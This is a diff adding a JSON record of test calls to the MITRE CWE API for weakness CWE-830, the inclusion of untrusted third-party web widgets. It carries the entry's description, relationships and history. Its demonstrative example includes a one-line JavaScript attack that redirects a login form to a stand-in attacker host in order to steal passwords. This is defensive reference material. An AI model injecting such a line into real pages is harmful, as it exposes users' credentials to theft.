@@ -1,0 +1,235 @@
+{
+  "test_info": {
+    "timestamp": "2025-09-30T00:11:46.493685",
+    "base_url": "https://cwe-api.mitre.org/api/v1",
+    "test_cwe_id": "830",
+    "total_endpoints_tested": 4
+  },
+  "results": {
+    "/cwe/830": {
+      "endpoint": "/cwe/830",
+      "url": "https://cwe-api.mitre.org/api/v1/cwe/830",
+      "status_code": 200,
+      "success": true,
+      "error": null,
+      "data": [
+        {
+          "Type": "variant_weakness",
+          "ID": "830"
+        }
+      ]
+    },
+    "/cwe/weakness/830": {
+      "endpoint": "/cwe/weakness/830",
+      "url": "https://cwe-api.mitre.org/api/v1/cwe/weakness/830",
+      "status_code": 200,
+      "success": true,
+      "error": null,
+      "data": {
+        "Weaknesses": [
+          {
+            "ID": "830",
+            "Name": "Inclusion of Web Functionality from an Untrusted Source",
+            "Abstraction": "Variant",
+            "Structure": "Simple",
+            "Status": "Incomplete",
+            "Description": "The product includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the product, potentially granting total access and control of the product to the untrusted source.",
+            "ExtendedDescription": "\n\nIncluding third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.\n\n\nEven if the third party is a trusted source, the product may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the product.\n\n\nThis weakness is common in \"mashup\" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '<SCRIPT SRC=\"http://other.domain.here\">' tags, which causes the code to run in the domain of the product, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.\n\n\nSuch dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.\n",
+            "RelatedWeaknesses": [
+              {
+                "Nature": "ChildOf",
+                "CweID": "829",
+                "ViewID": "1000",
+                "Ordinal": "Primary"
+              }
+            ],
+            "ModesOfIntroduction": [
+              {
+                "Phase": "Implementation",
+                "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
+              }
+            ],
+            "CommonConsequences": [
+              {
+                "Scope": [
+                  "Confidentiality",
+                  "Integrity",
+                  "Availability"
+                ],
+                "Impact": [
+                  "Execute Unauthorized Code or Commands"
+                ]
+              }
+            ],
+            "DemonstrativeExamples": [
+              {
+                "ID": "DX-94",
+                "Entries": [
+                  {
+                    "IntroText": "This login webpage includes a weather widget from an external website:"
+                  },
+                  {
+                    "Nature": "Bad",
+                    "Language": "HTML",
+                    "ExampleCode": "```\n\t<div class=\"header\"> Welcome!\n\t\t<div id=\"loginBox\">Please Login:\n\t\t\t<form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\">\n\t\t\tUsername: <input type=\"text\" name=\"username\" />\n\t\t\t<br/>\n\t\t\tPassword: <input type=\"password\" name=\"password\" />\n\t\t\t<input type=\"submit\" value=\"Login\" />\n\t\t\t</form>\n\t\t</div>\n\t\t<div id=\"WeatherWidget\">\n\t\t\t<script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script>\n\t\t</div>\n\t</div>\n```"
+                  },
+                  {
+                    "BodyText": "This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79)."
+                  },
+                  {
+                    "BodyText": "For example, user login information could easily be stolen with a single line added to weatherwidget.js:"
+                  },
+                  {
+                    "Nature": "Attack",
+                    "Language": "JavaScript",
+                    "ExampleCode": "```\n```\n...Weather widget code....* \n\tdocument.getElementById('loginForm').action = \"ATTACK.example.com/stealPassword.php\";"
+                  },
+                  {
+                    "BodyText": "This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site."
+                  }
+                ]
+              }
+            ],
+            "References": [
+              {
+                "ExternalReferenceID": "REF-778",
+                "Authors": [
+                  "Jeremiah Grossman"
+                ],
+                "Title": "Third-Party Web Widget Security FAQ",
+                "URL": "https://blog.jeremiahgrossman.com/2010/07/third-party-web-widget-security-faq.html",
+                "URLDate": "2023-04-07"
+              }
+            ],
+            "MappingNotes": {
+              "Usage": "Allowed",
+              "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
+              "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
+              "Reasons": [
+                "Acceptable-Use"
+              ]
+            },
+            "ContentHistory": [
+              {
+                "Type": "Submission",
+                "SubmissionName": "CWE Content Team",
+                "SubmissionOrganization": "MITRE",
+                "SubmissionDate": "2010-12-08",
+                "SubmissionVersion": "1.11",
+                "SubmissionReleaseDate": "2010-12-13"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2011-06-01",
+                "ModificationComment": "updated Common_Consequences"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2011-06-27",
+                "ModificationComment": "updated Demonstrative_Examples"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2012-05-11",
+                "ModificationComment": "updated Demonstrative_Examples"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2017-11-08",
+                "ModificationComment": "updated Modes_of_Introduction, Relationships"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2019-06-20",
+                "ModificationComment": "updated Type"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2020-02-24",
+                "ModificationComment": "updated Relationships"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2021-10-28",
+                "ModificationComment": "updated Relationships"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2023-01-31",
+                "ModificationComment": "updated Description"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2023-04-27",
+                "ModificationComment": "updated References, Relationships"
+              },
+              {
+                "Type": "Modification",
+                "ModificationName": "CWE Content Team",
+                "ModificationOrganization": "MITRE",
+                "ModificationDate": "2023-06-29",
+                "ModificationComment": "updated Mapping_Notes"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "/cwe/830/parents": {
+      "endpoint": "/cwe/830/parents",
+      "url": "https://cwe-api.mitre.org/api/v1/cwe/830/parents",
+      "status_code": 200,
+      "success": true,
+      "error": null,
+      "data": [
+        {
+          "Type": "base_weakness",
+          "ID": "829",
+          "ViewID": "1000",
+          "Primary_Parent": true
+        },
+        {
+          "Type": "category",
+          "ID": "1016",
+          "ViewID": "1008"
+        },
+        {
+          "Type": "category",
+          "ID": "1354",
+          "ViewID": "1344"
+        },
+        {
+          "Type": "category",
+          "ID": "1416",
+          "ViewID": "1400"
+        }
+      ]
+    },
+    "/cwe/830/children": {
+      "endpoint": "/cwe/830/children",
+      "url": "https://cwe-api.mitre.org/api/v1/cwe/830/children",
+      "status_code": 200,
+      "success": true,
+      "error": null,
+      "data": []
+    }
+  }
+}
